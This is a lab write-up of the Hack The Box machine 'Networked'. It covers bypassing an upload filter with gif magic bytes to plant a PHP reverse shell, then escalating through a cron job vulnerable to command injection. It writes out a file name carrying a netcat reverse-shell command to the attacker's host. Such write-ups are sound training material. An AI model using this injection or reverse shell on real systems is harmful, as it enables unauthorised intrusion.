---
title: "Hack The Box - Networked"
tags: [linux,easy,network script,cronjob,rce,magic bytes,image upload]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled.png)

## NMAP :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%201.png)

## Enumerating Web

→ Gobuster :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%202.png)

→ Found an image upload :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%203.png)

→ Found out where are the images being uploaded to :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%204.png)

→ Found an backup directory which has tar file which contains the files on the website :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%205.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%206.png)

⇒ Reading and understanding upload.php

→ It uploads to /var/www/html/uploads directory

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%207.png)

→ Only allows file names that end with the following :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%208.png)

→ Then it checks image mime type :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%209.png)

## Exploiting the Upload

⇒ We will be uploading an php-reverse-shell :

→ We added the extension gif and magic bytes of gif.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2010.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2011.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2012.png)

→ Now we have code execution 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2013.png)

→ Popped an reverse shell.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2014.png)

## Privilege Escalation to User

→ There's a cronjob running an php script as guly every 3mins :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2015.png)

⇒ This script checks for files that aren’t supposed to be in the uploads directory and deletes them, the interesting part is how it deletes the files, it appends the file name to the rm command without any filtering which makes it vulnerable to command injection.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2016.png)

→ Creating a file :

**`touch '; nc 10.10.14.4 4444 -c bash'`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2017.png)

→ After waiting for 3mins we get an shell :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2018.png)

## Privilege Escalation to Root

→ We have sudo on an script 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2019.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2019.png)

→ It looks like an network-script :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2020.png)

⇒ We found an exploit :

[https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2021.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Networked%20Box%206b5ef76c517348afa96073ba0c0c9d80/Untitled%2021.png)
